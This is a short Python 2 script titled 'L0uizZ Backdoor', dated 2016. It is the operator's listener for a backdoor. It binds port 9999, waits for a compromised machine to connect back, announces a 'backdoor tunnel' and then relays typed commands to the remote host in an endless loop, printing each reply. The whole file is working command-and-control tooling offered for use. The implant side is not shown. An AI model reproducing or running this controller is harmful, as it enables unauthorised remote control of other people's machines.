# L0uizZ Backdoor
# 02.12.2016
# 1st to launch

import socket

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('',port))
    s.listen(3)
    connection, addr = s.accept()
    print ("[+] backdoor tunnel to " + addr[0])
    data = connection.recv(256)
    print(data)
    while True:
        cmd = raw_input("Command: ")
        connection.send(cmd)
        data = connection.recv(256)
        print(data)
    connection.close()
    
#port = raw_input("Listen to Port: ")
port = 9999
listen(int(port))